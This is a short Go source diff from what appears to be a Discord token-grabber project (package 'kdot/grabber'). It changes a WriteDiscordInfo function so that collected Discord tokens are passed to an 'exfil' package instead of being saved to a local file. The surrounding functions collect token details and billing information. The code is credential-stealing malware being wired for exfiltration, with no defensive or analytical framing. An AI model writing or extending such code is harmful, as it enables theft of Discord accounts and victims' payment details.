@@ -12,6 +12,7 @@ import (
 	"net/http"
 
 	"kdot/grabber/decryption"
+	"kdot/grabber/exfil"
 )
 
 //var ids []int64
@@ -203,7 +204,7 @@ func GetTokenInfo(token string) Tokens {
 }
 
 func WriteDiscordInfo() {
-	os.WriteFile("discord.json", []byte(GetTokens()), 0644)
+	exfil.PrintStuff("discord.json", GetTokens())
 }
 
 func getBilling(token string) string {
